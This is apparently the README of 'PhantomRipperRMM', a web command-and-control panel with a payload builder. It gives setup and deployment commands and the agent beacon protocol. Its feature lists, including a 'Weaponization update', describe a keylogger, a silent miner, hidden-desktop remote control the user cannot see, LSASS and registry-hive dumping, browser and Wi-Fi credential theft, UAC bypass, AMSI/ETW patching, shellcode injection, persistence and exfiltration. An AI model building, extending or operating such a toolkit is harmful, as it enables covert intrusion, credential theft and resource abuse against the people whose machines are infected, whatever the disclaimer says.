# PhantomRipperRMM

**A web-based remote management panel** merging the best of two worlds:

- **OSRipper** — cross-platform Python agents, multi-layer obfuscation, DoH/HTTPS C2, keylogger, silent miner, web C2 dashboard.
- **PhantomRMM** — native C++ Windows agent with HVNC, Ghost (Chrome CDP), direct syscalls, SOCKS5 pivot, AES-GCM + ECDH crypto.

One dark, authenticated dashboard drives both agent families. Deployable to **Railway** or any **VPS/RDP** with Docker.

> ⚠️ Authorized penetration testing and red-team use only. You are responsible for complying with all applicable laws.

---

## Features

| Area | Capability |
|------|-----------|
| **Panel** | Neon dark SPA, JWT auth, multi-user roles (admin/operator), live WebSocket updates |
| **Sessions** | Table + detail view, system fingerprint, command queue, history, live terminal |
| **Builder** | Generate Python (cross-platform) or C++ (Windows) payloads from the browser, obfuscation, persistence/keylog/miner toggles |
| **Transports** | HTTPS, DoH, WebSocket, TCP |
| **Agents** | Python (Win/Linux/macOS, stdlib-only) and C++ (Win native: HVNC, Ghost, syscalls, SOCKS5) |
| **Listeners** | Named listener registry with transport metadata |
| **Audit** | Event log (auth, sessions, commands, payloads) |

---

## Architecture

```
┌─────────────────────── PhantomRipperRMM panel (Railway / VPS) ───────────────────────┐
│  SPA (public/)  ◄──►  Express API  ◄──►  Session Manager (SQLite)                    │
│                          │  ▲                                                        │
│                          │  └── WebSocket /ws/operator (live)                        │
│                          └──── /api/beacon, /api/response  (agents)                  │
│                          └──── Payload Builder ──► Python obfuscator / C++ build     │
└───────────────▲───────────────────────────────────────────────────────────▲─────────┘
                │ HTTPS / DoH / WSS                                          │
        ┌───────┴────────┐                                          ┌────────┴────────┐
        │ Python agent   │  (Windows / Linux / macOS)               │ C++ agent        │
        │ stdlib-only    │                                          │ HVNC·Ghost·SOCKS │
        └────────────────┘                                          └─────────────────┘
```

---

## Quick start (local)

Requirements: **Node 18+**, **Python 3.9+**.

```bash
# 1. Configure
cd panel/server
cp .env.example .env
#   edit .env — set JWT_SECRET, ADMIN_PASS, C2_HOST

# 2. Install + run
npm install
npm start
#   -> http://localhost:8443
```

Log in with `ADMIN_USER` / `ADMIN_PASS` (defaults `operator` / `changeme`).

### Smoke test the loop

With the panel running, start the bundled test agent (simulates a real beacon):

```bash
cd ../../payloads/agent
python test_agent.py --host http://127.0.0.1:8443
```

A new session appears on the dashboard. Open it, send `whoami`, watch the output.

### Build a payload

Panel → **Payload Builder** → pick agent type / OS / transport → **Build payload** →
download. The Python payload is obfuscated on the server via `payloads/obfuscator*.py`.

For a C++ payload, the panel records the request; produce the binary with:

```powershell
# Windows (MSVC or MinGW on PATH)
cd agent-cpp
.\build.ps1 -C2Host c2.example.com -C2Port 8443 -Tls
```

or cross-compile on Linux:

```bash
docker build -f docker/Dockerfile.builder -t pr-builder .
docker run --rm -v "$PWD/agent-cpp/out:/out" pr-builder
```

---

## Deploy

### Railway

1. Push this repo to GitHub.
2. New Railway project → **Deploy from GitHub** → select repo.
3. Railway reads `railway.json` and builds `docker/Dockerfile.panel`.
4. Set env vars (Variables tab): `JWT_SECRET`, `ADMIN_USER`, `ADMIN_PASS`,
   `C2_HOST` (your Railway domain), `C2_PORT=443`, `C2_SCHEME=https`.
5. Attach a **volume** mounted at `/app/panel/server/data` so the DB survives deploys.

### VPS / RDP (Docker)

```bash
git clone <your-repo> phantomripper && cd phantomripper
# edit docker/docker-compose.yml (JWT_SECRET, ADMIN_PASS, C2_HOST)
docker compose -f docker/docker-compose.yml up -d --build
```

Put a TLS terminator (Caddy/nginx) in front for real HTTPS. Point `C2_HOST` at it.

---

## Agent protocol

Both agent families speak the same minimal protocol:

```
POST {C2}/api/beacon     {"session_id":"...","info":{"hostname","username","os","arch","pid","privilege","agent_type"}}
  <- {"command":"..."}                      # "__TERMINATE__" ends the agent

POST {C2}/api/response   {"session_id":"...","command":"...","output":"..."}
  <- {"status":"ok"}
```

Python agents poll this over HTTPS/DoH. C++ agents use `agent-cpp/bridge/agent_beacon.hpp`
(WinHTTP) or connect over `/ws/agent?id=<session>` for push delivery.

---

## Layout

```
panel/server/          Express + ws backend, SQLite session manager, SPA
  src/routes/          auth, beacon (agent), api (operator)
  public/              the dashboard (no build step)
payloads/              Python agent template, obfuscators, test agent
agent-cpp/             C++ bridge + build.ps1 for the native agent
docker/                Dockerfile.panel, Dockerfile.builder, docker-compose.yml
railway.json           one-click Railway deploy
```

---

## Security notes

- Change `JWT_SECRET` and `ADMIN_PASS` before exposing the panel.
- Terminate TLS in front of the panel (Railway does this; on a VPS add Caddy/nginx).
- The panel binds `0.0.0.0` — restrict access with a firewall or reverse-proxy auth.
- Generated payloads are for **authorized** engagements only.

---

## Roadmap

- [ ] Telegram/Discord webhook on new session
- [ ] File browser + upload/download in the session view
- [ ] Process manager (list/kill)
- [ ] Geo-IP + country enrichment
- [ ] Malleable C2 profiles + domain fronting
- [ ] Wire HVNC stream into the session view (C++ agent)
- [ ] Ghost CDP credential harvesting surfaced in the dashboard

---

## v0.2 — Weaponization update

The panel and both agent families were upgraded to a full task-protocol implant framework:

**Panel**
- Structured tasks (verb + args + task_id correlation) alongside legacy string commands — old agents keep working untouched
- Artifact channel: chunked uploads land in the panel file store (screenshots, LSASS dumps, hives, exfil) with a dedicated Artifacts page, preview + download
- Binary WebSocket relay: agent frames stream to the operator console; operator input is injected back as binary frames
- Sticky task protocol: sessions keep their capability negotiation across thin beacons
- Telegram/Discord webhook alerting on new sessions

**Python agent (stdlib-only, module-gated at build time)**
- getsys — tiered SYSTEM escalation: SeDebug token theft from winlogon/lsass/services, SCM service spawn, SYSTEM schtasks, GodPotato/SweetPotato/PrintSpoofer passthrough
- Token vault + runas system|pid, steal
- UAC bypass (fodhelper auto-elevate), session-0-to-desktop worker (WTSQueryUserToken → CreateProcessAsUser)
- HVNC — private desktop (CreateDesktop + explorer), frame streaming over WS binary, full input injection; the user sees nothing
- Real keylogger (WH_KEYBOARD_LL + foreground window context + clipboard), DXGI-class GDI virtual-screen capture
- Credentials: LSASS MiniDump, SAM/SYSTEM/SECURITY hives, WiFi keys, Chrome/Edge logins (pure-python AES for v10 blobs, DPAPI)
- exec (local shellcode thread), inject (remote thread), pymod (in-memory python modules, no disk)
- runps (AMSI+ETW patched PowerShell), lateral (WMI/SC), network recon + threaded portscan, process manager
- Persistence tiers: Run/HKLM/SYSTEM task/service/startup
- Transports: HTTPS, DoH, WS (stdlib RFC6455 client), Telegram long-poll; header-carry malleable profile; decoy traffic; kill date; self-destruct

**C++ agent**
- Built-in task engine (pr_tasks.hpp): token theft + vault, service persist, session worker, BMP screen capture, WH_KEYBOARD_LL keylogger, local/remote shellcode execution, process manager — host dispatch remains the fallback

**Operator API additions**
- POST /api/sessions/:id/task · GET /api/sessions/:id/tasks
- GET /api/artifacts · GET /api/artifacts/:id/download · DELETE /api/artifacts/:id
- POST /api/artifact (agent chunked ingest)

Battle suite: node scripts/smoke_panel.mjs (34 assertions) · template validator covers 5 build profiles + obfuscator round-trip.
